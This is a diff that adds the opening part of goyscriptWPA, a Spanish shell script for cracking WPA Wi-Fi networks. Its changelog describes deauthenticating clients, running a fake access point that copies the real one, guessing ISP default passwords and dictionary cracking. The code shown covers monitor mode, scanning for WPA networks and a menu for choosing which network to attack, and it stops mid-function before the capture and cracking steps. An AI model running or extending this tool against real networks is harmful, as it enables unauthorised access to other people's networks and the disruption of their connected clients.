@@ -1,0 +1,1501 @@
+#!/bin/sh
+# LISTA DE CAMBIOS
+# version 0.2
+#	- version inicial (muy verde todavia)
+#	- sólo se obtiene el handshake y se muestran las contraseñas por defecto
+#	  de las redes WLAN_XXXX y JAZZTEL_XXXX
+# version 1.0
+#	- busca contraseñas con diccionarios genéricos cuando no se pueden usar personalizados
+#	  para ello se deben guardar los diccionarios en la carpeta "dic" y con el formato generico.<nombre>.dic
+#	- por hacer: si se trata de una red con contraseña por defecto conocida (WLAN o JAZZTEL), tras guardar
+#		     la contraseña por defecto, debería capturar el handshake y confirmar que dicha
+#		     contraseña es correcta.
+# versión 1.1
+#	- añadida la opción de conectarse a la red una vez descubierta la contraseña
+# versión 1.2
+#	- corregidos varios errores
+#	- reorganizadas las columnas del listado de redes detectadas (para evitar que los nombres
+#	  de red largos invadan la linea siguiente.
+#	- ahora cuando se trata de una red con contraseña por defecto conocida, además de guardarla en un
+#	  archivo, se procederá a capturar el handshake para confirmar si la contraseña es correcta.
+#	- añadido el parámetro "-l" o "--lista" para omitir la búsqueda de redes y usar las
+#	  encontradas en la búsqueda anterior. Si no existiera búsqueda anterior, se obvia.
+#	- cambiada la carpeta de trabajo a "wpa" para evitar conflictos con goyscriptWEP
+#	- cambiada la carpeta de contraseñas de "wifis" a "claves" (me parece un nombre más acertado)
+#	- mejoras estéticas
+# versión 1.3
+# 	- integrado el programa "wpaclean" para limpiar las capturas del handshake, consiguiendo así que pese
+# 	  menos de 1 KB.
+#	- recompilada, traducida e integrada la suite aircrack al script (versión svn-2259)
+# versión 1.4
+#	- corregido bug "wicd"
+#	- corregido bug con redes WLAN_XXXX (daba la contraseña por defecto como buena, en vez de capturar
+#	  el handshake y confirmar si se había cambiado o no)
+#	- implementada la búsqueda de contraseña en redes "Tele2" al vuelo (sin diccionario).
+#	  Se usará el diccionario si éste se encuentra en la carpeta "dic"; si no es así, se usará el script
+#	  que genera las contraseñas al vuelo y se las pasa a aircrack (es un pelín más lento, por eso tiene
+#	  preferencia el diccionario)
+# versión 1.5
+#	- corregido bug "networkmanager" (por USUARIONUEVO)
+# versión 1.6
+#	- implementada compatibilidad con Backtrack (y quizá otras como Ubuntu)
+#	- se mata NetworkManager antes de buscar redes (interfería con el proceso)
+# versión 1.7
+#	- corregido bug al conectarse a una red previamente desencriptada con goyscriptWPS
+#	- ahora cuando se consigue la contraseña o se cancela el proceso, aparece el menú de selección de red
+#	- recompilada, traducida e integrada la suite aircrack al script (versión svn-2275)
+# versión 1.8
+#	- corregido bug al conectarse a una red con contraseña de 64 caracteres
+#	- corregido bug cuando no hay diccionario en la carpeta correspondiente
+#	- corregido bug en la detección de la creación de diccionarios específicos
+#	- corregido bug en Backtrack
+# versión 1.9
+#	- añadidos diccionarios genéricos por script (al vuelo)
+# versión 2.0
+#	- mejorada la compatibilidad entre distribuciones
+# versión 2.1
+#	- corregido bug al conectarse a una red. Ahora podemos desconectarnos de dicha red,
+#	  matando wpa_supplicant, el cual mantenía fijado el canal.
+#	- recompilada, traducida e integrada la suite aircrack al script (versión svn-2288)
+# versión 2.7
+#	- Cambiado el sistema de numeración de la versión de los scripts para evitar confusiones
+#	  (ahora todos los scripts muestran la misma versión)
+#	- recompilada, traducida e integrada la suite aircrack al script (versión svn-2307)
+#	- corregido bug sobre la detección de la MAC de la interfaz en algunas distribuciones
+#	- ahora si no está instalado el cliente DHCP "dhclient" se prueba con "dhcpcd"
+# versión 2.8
+#	- Ahora se muestra la hora de expulsión de clientes y el número de intentos
+#	- Añadido diccionario al vuelo para redes de R (Galicia)
+#	- Añadido diccionario al vuelo para redes de Orange (son más de 200 millones de
+#	  posibles contraseñas, así que he añadido guardado de sesión automáticamente para
+#	  poder continuar en cualquier momento)
+#	- Corregido bug en Kali linux y BackTrack
+#	- Añadido parámetro "--datos" para poder pasar todos los parámetros necesarios
+#	  (imprescindible para poder funcionar con el launcher, pero se puede usar sin él)
+#	- Reemplazado el parámetro "--lista" por "-L" (más cómodo)
+# versión 2.9
+#	- Mejoras estéticas
+#	- Corregido bug (sólo dejaba escanear las redes una vez)
+# versión 3.0
+#	- Eliminado el molesto "Timbre en la sesión" en KDE al buscar clientes
+#	- Ahora al cancelar el proceso de descubrir red oculta se vuelve al menú de
+#	  selección de redes
+#	- Corrección de otros errores
+#	- Ahora al obtener el handshake se busca la contraseña con goyscriptDIC
+#	- Ahora se comprueba al inicio si el dispositivo de almacenamiento es de
+#	  sólo lectura
+# versión 3.1
+#	- Ahora se crea un AP falso idéntico al real.
+#	  Esto facilita la obtención del handshake si el cliente se aleja del AP real
+#	  y se acerca al falso (nosotros). Cada 2 intentos se alterna entre AP real y falso.
+#	- mdk3 traducido e integrado a la suite en la carpeta "software"
+#	- Añadido método de expulsión de clientes con mdk3 (se alterna automáticamente con aireplay)
+#	- Ahora se comprueba si se tienen permisos de root para poder ejecutar el script
+#	- Ahora se desactiva el modo monitor y se inicia wicd al cerrar el script
+# versión 3.2
+#	- Corrección de errores
+# versión 3.3
+#	- Corrección de errores
+#	- Ahora el AP falso usa exactamente el mismo tipo de encriptación que el AP real
+#         (imprescindible para la obtención de un handshake válido)
+# versión 3.4
+#	- Ahora se puede usar sin interfaz gráfica (con goyscriptTTY)
+#	- Añadida compatibilidad con OpenWrt
+
+
+
+##### CONSTANTES #####
+
+negro="\033[0;30m"
+rojo="\033[0;31m"
+verde="\033[0;32m"
+marron="\033[0;33m"
+azul="\033[0;34m"
+magenta="\033[0;35m"
+cyan="\033[01;36m"
+grisC="\033[0;37m"
+gris="\033[1;30m"
+rojoC="\033[1;31m"
+verdeC="\033[1;32m"
+amarillo="\033[1;33m"
+azulC="\033[1;34m"
+magentaC="\033[1;35m"
+cyanC="\033[1;36m"
+blanco="\033[1;37m"
+subrayar="\E[4m"
+parpadeoON="\E[5m"
+parpadeoOFF="\E[0m"
+resaltar="\E[7m"
+
+DEBUG="-hold"
+DEBUG="" #comentar esta línea para activar el modo depuración
+
+NUM=1
+CERO="0"
+MAXIMO_PESO_DE_LA_CAPTURA=9900 # Aquí se fija el peso máximo en KB del archivo
+			       # de captura (superado éste se reiniciará la misma)
+SEGUNDOS_ENTRE_EXPULSIONES=30 # Tiempo en segundos que dejaremos transcurrir antes de
+                              # expulsar de nuevo un cliente
+CAMBIO_AP_REAL_FALSO=2 # Intentos antes de alternar entre AP real y AP falso
+
+#PROGRAMAS
+WRT=`ps | grep goyscriptWRT | grep -v grep`
+if [ "$WRT" = "" ] #si no se está usando goyscriptWRT
+then
+	AIRCRACK="./software/aircrack-ng"
+	AIREPLAY="./software/aireplay-ng -R --ignore-negative-one"
+	AIRMON="./software/airmon-ng"
+	AIRODUMP="./software/airodump-ng"
+	WPACLEAN="./software/wpaclean"
+	AIRBASE="./software/airbase-ng"
+	MDK3="./software/./mdk3"
+	WPA_PSK_RAW="./software/wpa_passphraseMOD" # modificación de wpa_passphrase para que no compruebe la longitud de la contraseña (y en español ;-D)
+	PARAMETRO_PS="-A"
+else #si se está usando goyscriptWRT
+	AIRCRACK="aircrack-ng"
+	AIREPLAY="aireplay-ng -R --ignore-negative-one"
+	AIRMON="airmon-ng"
+	AIRODUMP="airodump-ng"
+	WPACLEAN="wpaclean"
+	AIRBASE="airbase-ng"
+	MDK3="mdk3"
+	WPA_PSK_RAW="wpa_passphrase" # modificación de wpa_passphrase para que no compruebe la longitud de la contraseña (y en español ;-D)
+	PARAMETRO_PS=""
+fi
+SCREEN="screen"
+FABRICANTE="software/./fabricante.sh"
+PASAR_DICCIONARIO="./software/./pasar_diccionario.sh"
+
+TMP="tmp"
+CAPTURA="wpa"
+CLAVES="claves"
+VERSION=$(cat VERSION)
+
+# LOS SIGUIENTES PARÁMETROS SE APLICAN POR DEFECTO CUANDO NO ES POSIBLE
+# DETECTAR LA RESOLUCIÓN DE LA PANTALLA. ESTÁN OPTIMIZADOS PARA UNA
+# RESOLUCIÓN DE 1024x768 PORQUE LA MAYORÍA DE LAS DISTRIBUCIONES DE
+# LINUX ES LA QUE USAN POR DEFECTO
+NORMAL="-fg black -bg white"
+INFORMA="-fg black -bg yellow"
+MAL="-fg black -bg red"
+BIEN="-fg black -bg green"
+FUENTE="-fs 8"
+BUSCAR_REDES_VENTANA="-geometry 100x100-0+0"
+AIRODUMP_VENTANA="-geometry 90x15-0-0"
+CLIENTE_VENTANA="-geometry 90x2-0+0"
+AIRCRACK_VENTANA="-geometry 70x23-0-0"
+
+
+#############
+# FUNCIONES #
+#############
+
+#HORA DE INICIO
+hora_inicio()
+{
+ano1=`date +%Y`
+mes1=`date +%m`
+dia1=`date +%d`
+hora1=`date +%H`
+minutos1=`date +%M`
+segundos1=`date +%S`
+segundos_del_ano1=`date +%s`
+}
+
+#HORA DE FINALIZACIÓN
+hora_fin()
+{
+ano2=`date +%Y`
+mes2=`date +%m`
+dia2=`date +%d`
+hora2=`date +%H`
+minutos2=`date +%M`
+segundos2=`date +%S`
+segundos_del_ano2=`date +%s`
+}
+
+#DIFERENCIA DE TIEMPO ENTRE "HORA DE INICIO" Y "HORA DE FINALIZACIÓN"
+calcular_tiempo()
+{
+segundos=`expr $segundos_del_ano2 - $segundos_del_ano1`
+minutos=0
+horas=0
+dias=0
+dias=`expr $segundos / 86400`
+segundos=`expr $segundos % 86400`
+horas=`expr $segundos / 3600`
+segundos=`expr $segundos % 3600`
+minutos=`expr $segundos / 60`
+segundos=`expr $segundos % 60`
+}
+
+mostrar_duracion()
+{
+echo -e $cyanC"Duración del proceso...: "$blanco"\c"
+if [ $dias -ne 0 ]	# DESGLOSE EN DIAS, HORAS, MINUTOS Y SEGUNDOS DE LA DURACIÓN DEL PROCESO
+then
+	if [ $dias -eq 1 ]
+	then
+		echo -e "$dias día\c"
+	else
+		echo -e "$dias días\c"
+	fi
+	if [ $horas -ne 0 ] && [ $minutos -eq 0 ] && [ $segundos -eq 0 ]
+	then
+		echo -e " y \c"
+	else
+		if [ $horas -eq 0 ] && [ $minutos -ne 0 ] && [ $segundos -eq 0 ]
+		then
+			echo -e " y \c"
+		else
+			if [ $horas -eq 0 ] && [ $minutos -eq 0 ] && [ $segundos -ne 0 ]
+			then
+				echo -e " y \c"
+			else
+				if [ $horas -ne 0 ] || [ $minutos -ne 0 ] || [ $segundos -ne 0 ]
+				then
+					echo -e ", \c"
+				fi
+			fi
+		fi
+	fi
+fi
+if [ $horas -ne 0 ]
+then
+	if [ $horas -eq 1 ]
+	then
+		echo -e "$horas hora\c"
+	else
+		echo -e "$horas horas\c"
+	fi
+	if [ $minutos -ne 0 ] && [ $segundos -eq 0 ]
+	then
+		echo -e " y \c"
+	fi
+	if [ $minutos -eq 0 ] && [ $segundos -ne 0 ]
+	then
+		echo -e " y \c"
+	fi
+	if [ $minutos -ne 0 ] && [ $segundos -ne 0 ]
+	then
+		echo -e ", \c"
+	fi
+fi
+if [ $minutos -ne 0 ]
+then
+	if [ $minutos -eq 1 ]
+	then
+		echo -e "$minutos minuto\c"
+	else
+		echo -e "$minutos minutos\c"
+	fi
+	if [ $segundos -ne 0 ]
+	then
+		echo -e " y \c"
+	fi
+fi
+if [ $segundos -ne 0 ]
+then
+	if [ $segundos -eq 1 ]
+	then
+		echo -e "$segundos segundo\c"
+	else
+		echo -e "$segundos segundos\c"
+	fi
+else
+	echo -e "$segundos segundos\c"
+fi
+echo -e "$grisC"
+echo
+}
+
+#COMPRUEBA SI HAY INTERFACES EN MODO MONITOR Y, SI LAS HAY, LAS DESACTIVA
+desactivar_todos_monX()
+{
+INTERFACES_MONITOR=`iwconfig --version | grep "Recommend" | awk '{print $1}' | grep mon`
+let CUANTAS=`echo "$INTERFACES_MONITOR" | wc -l`
+let CONT=1
+while [ $CONT -le $CUANTAS ]
+do
+	MON=`echo "$INTERFACES_MONITOR" | sed -n ${CONT}p`
+	$AIRMON stop $MON > /dev/null 2>&1
+	let CONT=$CONT+1
+done
+}
+
+#DETIENE POSIBLES PROCESOS EN MARCHA
+matar_procesos()
+{
+echo -e "$cyan""\n$1"
+echo -e "$grisC"
+PROCESOS=`ps $PARAMETRO_PS | grep -e xterm -e ifconfig -e dhcpcd -e dhclient -e NetworkManager -e wpa_supplicant -e udhcpc -e airbase-ng | grep -v grep`
+while [ "$PROCESOS" != "" ]
+do
+	killall -q xterm ifconfig dhcpcd dhclient dhclient3 NetworkManager wpa_supplicant udhcpc airbase-ng >/dev/null 2>&1
+	PROCESOS=`ps $PARAMETRO_PS | grep -e xterm -e ifconfig -e dhcpcd -e dhclient -e NetworkManager -e wpa_supplicant -e udhcpc -e airbase-ng | grep -v grep`
+done
+#desactivar_todos_monX
+}
+
+#BORRA ARCHIVOS DE SESIONES ANTERIORES
+borrar_sesiones_anteriores()
+{
+if [ -d "./$CAPTURA" ]
+then
+	echo -e ""$cyan"Borrando archivos temporales de sesiones anteriores..."$grisC""
+	echo
+	mv $CAPTURA/wifis.csv $CAPTURA/anteriorCSV.wifis > /dev/null 2>&1
+	mv $CAPTURA/clientes_wpa.csv $CAPTURA/anteriorCSV.wifis-wpa-clientes > /dev/null 2>&1
+	rm -rf $CAPTURA/red_oculta*  > /dev/null 2>&1
+	rm -rf $CAPTURA/*.cap > /dev/null 2>&1
+	rm -rf $CAPTURA/ataque5.cap > /dev/null 2>&1
+	rm -rf $CAPTURA/*.kismet.csv > /dev/null 2>&1
+	rm -rf $CAPTURA/*.kismet.netxml > /dev/null 2>&1
+	rm -rf $CAPTURA/diccionario* > /dev/null 2>&1
+fi
+mkdir $CAPTURA > /dev/null 2>&1
+mkdir "$TMP" > /dev/null 2>&1
+mkdir handshakes > /dev/null 2>&1
+mkdir dic > /dev/null 2>&1
+mkdir -p "$CLAVES"  > /dev/null 2>&1
+rm -rf *.cap > /dev/null 2>&1
+rm -rf *.xor > /dev/null 2>&1
+}
+
+#NOMBRE Y VERSIÓN DEL SCRIPT
+version()
+{
+if [ "$DESDE_DATOS" = "NO" ]
+then
+	clear
+fi
+SCRIPT=" GOYscriptWPA $VERSION by GOYfilms "
+N_SCRIPT=${#SCRIPT}
+N_VERSION=${#VERSION}
+let CARACTERES=$N_SCRIPT*3
+LINEA=`echo "══════════════════════════════════════════" | cut -c-${CARACTERES}`
+echo -e "$blanco\c"
+echo -e "╔${LINEA}╗"
+echo -e "║${SCRIPT}║"
+echo -e "╚${LINEA}╝"
+echo -e $grisC
+}
+
+#SELECCIÓN DE LA TARJETA WiFi
+seleccionar_tarjeta()
+{
+INTERFAZ=0
+INTERFAZ_MONITOR=0
+desactivar_todos_monX
+TARJETAS_WIFI_DISPONIBLES=`iwconfig --version | grep "Recommend" | awk '{print $1}' | sort`
+N_TARJETAS_WIFI=`echo $TARJETAS_WIFI_DISPONIBLES | awk '{print NF}'`
+if [ "$TARJETAS_WIFI_DISPONIBLES" = "" ]
+then
+	echo -e ""$rojoC"ERROR: No se detectó ninguna tarjeta WiFi"
+	echo -e "$grisC"
+	pulsar_una_tecla "Pulsa una tecla para salir..."
+else
+	echo -e ""$cyan"Tarjetas WiFi disponibles:"$grisC""
+	echo
+	x=1
+	while [ $x -le $N_TARJETAS_WIFI ]
+	do
+		INTERFAZ=`echo $TARJETAS_WIFI_DISPONIBLES | awk '{print $'$x'}'`
+		DRIVER=`ls -l /sys/class/net/$INTERFAZ/device/driver | sed 's/^.*\/\([a-zA-Z0-9_-]*\)$/\1/'`
+		MAC=`ifconfig "$INTERFAZ" | grep -oE '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}' | awk '{print toupper($0)}' | cut -c-8` #extraemos la MAC XX:XX:XX (sólo los 3 primeros pares)
+		FABRICANTE_INTERFAZ=`$FABRICANTE "$MAC"`
+		if [ $x -eq 1 ]
+		then
+			echo -e ""$cyan" Nº\tINTERFAZ\tDRIVER\t\tFABRICANTE"
+			echo -e ""$cyan" ══\t════════\t══════\t\t══════════"
+		fi
+		CARACTERES_DRIVER=`echo $DRIVER | wc -c` 
+		if [ $CARACTERES_DRIVER -gt 8 ] #CONTROLA LA TABULACIÓN DEPENDIENDO DE LOS CARACTERES QUE TENGA LA VARIABLE "DRIVER"
+		then
+			TAB=""
+		else
+			TAB="\t"
+		fi
+		echo -e ""$amarillo" $x)\t$INTERFAZ \t\t$DRIVER\t"$TAB"$FABRICANTE_INTERFAZ"
+		x=$((x+1))
+	done
+	if [ $N_TARJETAS_WIFI -gt 1 ] # SI DETECTA MAS DE UNA NOS PREGUNTA CUAL QUEREMOS
+	then
+		echo -e "\n"$cyan"\nSelecciona una tarjeta WiFi:\c"
+		echo -e ""$amarillo" \c"
+		read -n 1 OPCION
+		while [[ $OPCION < 1 ]] || [[ $OPCION > $N_TARJETAS_WIFI ]]
+		do
+			echo -en "\a\033[10C"$rojoC"OPCIÓN NO VÁLIDA"$grisC""
+			echo -en ""$cyan"\rSelecciona una tarjeta WiFi: "$amarillo"\c"
+			read -n 1 OPCION
+		done
+	else
+		OPCION=1
+	fi
+	echo -en "\a\033[10C                "$grisC"" #BORRA EL MENSAJE DE "OPCIÓN NO VÁLIDA"
+fi
+if [ $N_TARJETAS_WIFI -gt 1 ] # SI DETECTA MÁS DE UNA VARÍA EL MENSAJE
+then
+	INTERFAZ=`echo $TARJETAS_WIFI_DISPONIBLES | awk '{print $'$OPCION'}'`
+	echo -e "\n"
+	echo -e ""$cyan"Has seleccionado: "$verdeC"$INTERFAZ"$grisC""
+	echo
+else
+	echo
+	echo -e ""$cyan"Sólo se ha detectado una tarjeta WiFi: "$verdeC"$INTERFAZ"$grisC""
+	echo
+fi
+}
+
+#MUESTRA LA RESOLUCIÓN DE PANTALLA ACTUAL
+mostrar_resolucion_de_pantalla()
+{
+#CALCULAMOS LA RESOLUCION DE LA PANTALLA. DEPENDIENDO DE LA VERSION DE "xrandr" SE RECORTA DE UNA FORMA U OTRA
+which xdpyinfo > /dev/null 2>&1
+if [ $? -eq 0 ]
+then
+	RESOLUCION=`xdpyinfo | grep -A 3 "screen #0" | grep dimensions | tr -s " " | cut -d" " -f 3`
+else
+	which xrandr > /dev/null 2>&1
+	if [ $? -eq 0 ]
+	then
+ 		RESOLUCION=`xrandr | grep "*" | awk '{print $1}'`
+ 		RESOLUCION=`echo $RESOLUCION | grep "x"`
+		if [ "$RESOLUCION" = "" ]
+		then
+			RESOLUCION=`xrandr | grep "current" | awk -F "current" '{print $2}' | awk -F " " '{print $1$2$3}' | awk -F "," '{print $1}'`
+			RESOLUCION=`echo $RESOLUCION | grep "x"`
+		fi
+		if [ "$RESOLUCION" = "" ]
+		then
+			RESOLUCION=`xrandr | grep "*" | awk '{print $2$3$4}'`
+			RESOLUCION=`echo $RESOLUCION | grep "x"`
+		fi
+	else
+		which Xvesa > /dev/null 2>&1
+		if [ $? -eq 0 ]
+		then
+			RESOLUCION=`Xvesa -listmodes 2>&1 | grep ^0x | awk '{ printf "%s %s\n",$2,$3 }' | sort -n | grep x[1-2][4-6] | tail -n 1 | awk -F 'x' '{print $1"x"$2}'`
+		else
+			RESOLUCION=""
+		fi
+	fi
+fi
+case $RESOLUCION in
+	1920x1080)
+		FUENTE="-fn 9x15bold"
+		BUSCAR_REDES_VENTANA="-geometry 105x100-0+0"
+		AIRODUMP_VENTANA="-geometry 100x18-0-0"
+		CLIENTE_VENTANA="-geometry 100x5-0+0"
+		AIRCRACK_VENTANA="-geometry 80x25-0+0";;
+	1280x1024)
+		FUENTE="-fs 8"
+		AIRODUMP_VENTANA="-geometry 100x31-0-0"
+		CLIENTE_VENTANA="-geometry 100x3-0+0"
+		AIRCRACK_VENTANA="-geometry 80x25-0-0";;
+	1280x800)
+		FUENTE="-fs 8"
+		AIRODUMP_VENTANA="-geometry 100x15-0-0"
+		CLIENTE_VENTANA="-geometry 100x3-0+0"
+		AIRCRACK_VENTANA="-geometry 80x25-0-0";;
+	1024x600)
+		FUENTE="-fs 8"
+		BUSCAR_REDES_VENTANA="-geometry 100x100-0+0"
+		AIRODUMP_VENTANA="-geometry 90x15-0-0"
+		CLIENTE_VENTANA="-geometry 90x2-0+0"
+		AIRCRACK_VENTANA="-geometry 70x23-0-0";;
+	"")
+		RESOLUCION=""$rojoC"[no detectada]";;
+esac
+
+case $TERM in #EN DISTRIBUCIONES COMO BEINI, LOS PARAMETROS DE LA CONSOLA SON DISTINTOS
+	rxvt)
+		parpadeoON=""
+		NORMAL="+sb -fg black -bg white"
+		INFORMA="+sb -fg black -bg yellow"
+		MAL="+sb -fg black -bg red"
+		BIEN="+sb -fg black -bg green"
+		FUENTE=""
+		BUSCAR_REDES_VENTANA="-geometry 100x59-0+0"
+		AIRODUMP_VENTANA="-geometry 100x18-0-0"
+		CLIENTE_VENTANA="-geometry 100x2-0+0"
+		AIRCRACK_VENTANA="-geometry 70x23-0-0";;
+esac
+echo -e ""$cyan"Resolución de pantalla actual: "$verdeC"$RESOLUCION"$grisC""
+echo
+}
+
+#INICIALIZACIÓN DE LA TARJETA
+iniciar_tarjeta()
+{
+echo -e ""$cyan"Iniciando la tarjeta WiFi..."$grisC""
+echo
+ifconfig $INTERFAZ down
+ifconfig $INTERFAZ up
+iwconfig $INTERFAZ rate 1M
+}
+
+#ACTIVA EL MODO MONITOR DE LA INTERFAZ
+activar_modo_monitor()
+{
+software/./reiniciar_interfaz.sh $INTERFAZ
+MAC_INTERFAZ=`ifconfig "$INTERFAZ" | grep -oE '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}' | awk '{print toupper($0)}'` #extraemos la MAC de la interfaz del comando 'ifconfig'
+echo -e ""$cyan"Activando modo monitor en $blanco$INTERFAZ $grisC("$MAC_INTERFAZ")$cyanC..."$grisC""
+$AIRMON start $INTERFAZ $CANAL
+ifconfig mon0 > /dev/null 2>&1
+if [ $? = 0 ] #SI LA ORDEN ANTERIOR SE COMPLETÓ CORRECTAMENTE, SIGNIFICA QUE EXISTE LA INTERFAZ "mon0"
+then
+	INTERFAZ_MONITOR=mon0
+else
+	INTERFAZ_MONITOR=$INTERFAZ
+fi
+}
+
+#BÚSQUEDA DE REDES WPA
+buscar_redes()
+{
+rm -rf $CAPTURA/wifis* > /dev/null 2>&1 #borra los archivos de búsqueda anteriores
+if [ -x "/etc/rc.d/rc.wicd" ]; then
+   killwicd > /dev/null 2>&1
+else	
+   /etc/rc.d/rc.networkmanager stop > /dev/null 2>&1
+fi
+echo -e "$cyan$parpadeoON"
+echo -e "╔════════════════════════════════╗"
+echo -e "║                                ║"
+echo -e "║$parpadeoOFF "$cyan" PULSA CONTROL+C PARA DETENER  $parpadeoON║"
+echo -e "║$parpadeoOFF "$cyan" LA  BÚSQUEDA  Y  SELECCIONAR  $parpadeoON║"
+echo -e "║$parpadeoOFF "$cyan" UNA DE LAS REDES DETECTADAS   $parpadeoON║"
+echo -e "║                                ║"
+echo -e "╚════════════════════════════════╝"
+echo -e "$parpadeoOFF""$grisC"
+xterm $DEBUG $NORMAL $FUENTE $BUSCAR_REDES_VENTANA -title "BUSCANDO REDES WiFi" -e $AIRODUMP --encrypt WPA -w ./$CAPTURA/wifis $INTERFAZ_MONITOR
+LINEAS_AP=`cat $CAPTURA/wifis-01.csv | egrep -a -n '(Station|Cliente)' | awk -F : '{print $1}'` #Nº LINEAS HASTA "Station" o "Cliente" (si se usa el airodump-ng traducido) :D
+LINEAS_AP=`expr $LINEAS_AP - 1` #RESTAMOS 1 PARA ELIMINAR TAMBIÉN LA LINEA "Station"
+head -n $LINEAS_AP $CAPTURA/wifis-01.csv &> $CAPTURA/wifis.csv #GUARDAMOS EN UN ARCHIVO LOS APs
+tail -n +$LINEAS_AP $CAPTURA/wifis-01.csv &> $CAPTURA/clientes_wpa.csv #GUARDAMOS EN OTRO LOS CLIENTES
+clear
+LINEAS_WIFIS_CSV=`wc -l $CAPTURA/wifis.csv | awk '{print $1}'`
+if [ $LINEAS_WIFIS_CSV -le 3 ] 	#SI EL ARCHIVO "wifis.csv" TIENE 3 LINEAS
+then				#ES QUE NO SE DETECTÓ NINGUNA RED
+	echo -e "$rojoC"
+	echo -e "No se encontró ninguna red WiFi con contraseña WPA."
+	echo -e "$grisC"
+	pulsar_una_tecla "Pulsa una tecla para salir..."
+fi
+rm -rf $CAPTURA/wifis.goy > /dev/null 2>&1
+i=0
+while IFS=, read MAC FTS LTS CHANNEL SPEED PRIVACY CYPHER AUTH POWER BEACON IV LANIP IDLENGTH ESSID KEY
+do
+	caracteres_mac=${#MAC}
+	if [ $caracteres_mac -ge 17 ]
+	then
+		i=$(($i+1))
+		if [[ $POWER -lt 0 ]]
+		then
+			if [[ $POWER -eq -1 ]]
+			then
+				POWER=0
+			else
+				POWER=`expr $POWER + 100`
+			fi
+		fi
+		POWER=`echo $POWER | awk '{gsub(/ /,""); print}'` #ELIMINA LOS ESPACIOS SI LOS HAY
+		IV=`echo $IV | awk '{gsub(/ /,""); print}'` #CORRIGE LOS IVs RECORTANDO LOS ESPACIOS
+		ESSID=`expr substr "$ESSID" 2 $IDLENGTH` #CORRIGE EL NOMBRE DE LA RED WiFi RECORTANDO EL ESPACIO DEL PRINCIPIO
+		if [ $CHANNEL -gt 13 ] || [ $CHANNEL -lt 1 ] #SI EL CANAL NO ESTÁ ENTRE 1 Y 13 ENTONCES NO ES VÁLIDO
+		then
+			CHANNEL=0
+		else
+			CHANNEL=`echo $CHANNEL | awk '{gsub(/ /,""); print}'` #CORRIGE EL CANAL ELIMINANDO LOS ESPACIOS
+		fi
+		if [ "$ESSID" = "" ] || [ "$CHANNEL" = "-1" ] #SI EL NOMBRE DE LA RED ESTÁ VACÍO ES QUE ES UNA RED OCULTA
+		then
+			ESSID="< Oculta >"
+		fi
+		echo -e "$MAC,$CHANNEL,$IV,$POWER,$ESSID" >> $CAPTURA/wifis.goy
+	fi
+done < $CAPTURA/wifis.csv
+sort -t "," -d -k 4 "$CAPTURA/wifis.goy" > "$CAPTURA/redes_wpa.goy"
+}
+
+#SELECCIÓN DE LA RED A ATACAR
+seleccionar_red()
+{
+clear
+echo -e ""$cyan"\c"
+echo "          Redes WiFi detectadas con contraseña WPA        "
+echo "          ════════════════════════════════════════        "
+echo
+echo "  Nº          MAC         CANAL  IVs  SEÑAL  NOMBRE DE RED"
+echo "  ══   ═════════════════  ═════  ═══  ═════  ═════════════"
+i=0
+while IFS=, read MAC CANAL IV POTENCIA ESSID
+do
+	i=$(($i+1))
+	if [ $i -le 9 ] #ALINEA A LA DERECHA EL NUMERO DE OPCIÓN
+	then
+		ESPACIO1=" "
+	else
+		ESPACIO1=""
+	fi
+	if [[ $CANAL -le 9 ]] #ALINEA A LA DERECHA EL CANAL
+	then
+		ESPACIO2=" "
+		if [[ $CANAL -eq 0 ]]
+		then
+			CANAL="-"
+		fi
+	else
+		ESPACIO2=""
+	fi
+	if [[ $IV -le 9 ]] #ALINEA A LA DERECHA LOS IVs
+	then
+		ESPACIO3=" "
+	else
+		ESPACIO3=""
+	fi
+	if [[ "$POTENCIA" = "" ]]
+	then
+		POTENCIA=0
+	fi
+	if [[ $POTENCIA -le 9 ]] #ALINEA A LA DERECHA LA POTENCIA DE LA SEÑAL
+	then
+		ESPACIO4=" "
+	else
+		ESPACIO4=""
+	fi
+	if [[ $IV -eq 0 ]] #SI NO SE HAN CAPTURADO IVs LO CAMBIAMOS POR "-". ME GUSTA MÁS PORQUE DESTACA MENOS QUE UN "0"
+	then
+		IV="-"
+	else
+		if [[ $IV -gt 99 ]]
+		then
+			let IV=99 #PARA QUE NO SE DESCUADREN LAS COLUMNAS
+		fi
+	fi
+	MAC_GUIONES=`echo $MAC | awk '{gsub(/:/,"-"); print}'`
+	EXISTE_CLAVE=`find "$CLAVES" | grep "$ESSID ($MAC_GUIONES).txt"`
+	EXISTE_HANDSHAKE=`find handshakes | grep "$ESSID ($MAC_GUIONES).cap"`
+	if [ ! "$EXISTE_CLAVE" = "" ] #CAMBIAMOS EL COLOR DEPENDIENDO DE SI YA TENEMOS LA CLAVE Y OTROS FACTORES
+	then
+		echo -e "$magenta\c"
+	else
+		if [ ! "$EXISTE_HANDSHAKE" = "" ] #SINÓ CAMBIAMOS EL COLOR SI YA TENEMOS EL HANDSHAKE: MARRÓN
+		then
+			echo -e "$marron\c"
+		else
+			if [ "$ESSID" = "< Oculta >" ] #SI LA RED ESTÁ OCULTA LA MARCAMOS DE COLOR ROJO
+			then
+				echo -e "$rojoC\c"
+			else
+				echo -e "$blanco\c" #SI NO REUNE NINGUNA DE LAS CARACTERÍSTICAS ANTERIORES, LA LINEA SERÁ BLANCA
+			fi
+		fi
+	fi
+	CLIENTE=`cat $CAPTURA/clientes_wpa.csv | grep $MAC`
+	if [ "$CLIENTE" != "" ]
+	then
+		CLIENTE="#" #MUESTRA UNA ALMOHADILLA EN LAS REDES QUE TIENEN CLIENTES CONECTADOS
+		ESPACIO5=""
+	else
+		ESPACIO5=" "
+	fi
+	nombres_ap[$i]=$ESSID
+	canales[$i]=$CANAL
+	macs[$i]=$MAC
+	echo -e " $ESPACIO1$i)$CLIENTE  $ESPACIO5$MAC   $ESPACIO2$CANAL    $ESPACIO3$IV    $ESPACIO4$POTENCIA%   $ESSID"
+done < "$CAPTURA/redes_wpa.goy"
+echo
+if [ $i -eq 1 ] #SI SÓLO SE HA DETECTADO UNA RED YA NO NOS DÁ A ESCOGER ;-D
+then
+	SELECCION=1
+else
+	echo -e ""$cyan"\rSelecciona una red de la lista: "$amarillo"\c"
+	read SELECCION
+fi
+while [[ $SELECCION -lt 1 ]] || [[ $SELECCION -gt $i ]]
+do
+	echo -en "\a\033[1A\033[40C"$rojoC"OPCIÓN NO VÁLIDA"$grisC""
+	echo -en "\a\r"$cyan"Selecciona una red de la lista: "$amarillo"\c"
+	read SELECCION
+done
+#NOMBRE_AP=${nombres_ap[$SELECCION]}
